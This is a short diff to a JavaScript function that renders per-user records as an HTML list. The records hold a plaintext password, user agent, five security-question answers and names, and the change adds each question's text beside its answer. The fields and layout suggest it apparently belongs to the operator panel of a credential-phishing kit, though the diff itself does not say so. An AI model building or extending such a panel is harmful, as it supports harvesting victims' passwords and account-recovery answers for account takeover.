@@ -127,11 +127,11 @@ function updateConnectionsTable(users) {
             <li class="list-group-item">Password: ${details.getUserDataLogin.password || ''}</li>
             <li class="list-group-item">UserAgent: ${details.getUserDataLogin.userAgent || ''}</li>
               <li class="list-group-item">----------------------------------------------------------</li>
-              <li class="list-group-item">Question 1: ${details.getUserDataQuestion.answer1 || ''}</li>
-              <li class="list-group-item">Question 2: ${details.getUserDataQuestion.answer2 || ''}</li>
-              <li class="list-group-item">Question 3: ${details.getUserDataQuestion.answer3 || ''}</li>
-              <li class="list-group-item">Question 4: ${details.getUserDataQuestion.answer4 || ''}</li>
-              <li class="list-group-item">Question 5: ${details.getUserDataQuestion.answer5 || ''}</li>
+              <li class="list-group-item">${details.getUserDataQuestion.question1 || ''} : ${details.getUserDataQuestion.answer1 || ''}</li>
+              <li class="list-group-item">${details.getUserDataQuestion.question2 || ''} : ${details.getUserDataQuestion.answer2 || ''}</li>
+              <li class="list-group-item">${details.getUserDataQuestion.question3 || ''} : ${details.getUserDataQuestion.answer3 || ''}</li>
+              <li class="list-group-item">${details.getUserDataQuestion.question4 || ''} : ${details.getUserDataQuestion.answer4 || ''}</li>
+              <li class="list-group-item">${details.getUserDataQuestion.question5 || ''} : ${details.getUserDataQuestion.answer5 || ''}</li>
                 <li class="list-group-item">----------------------------------------------------------</li>
             <li class="list-group-item">Fist Name: ${details.getUserDataDetails.fname || ''}</li>
             <li class="list-group-item">Last Name: ${details.getUserDataDetails.lname || ''}</li>
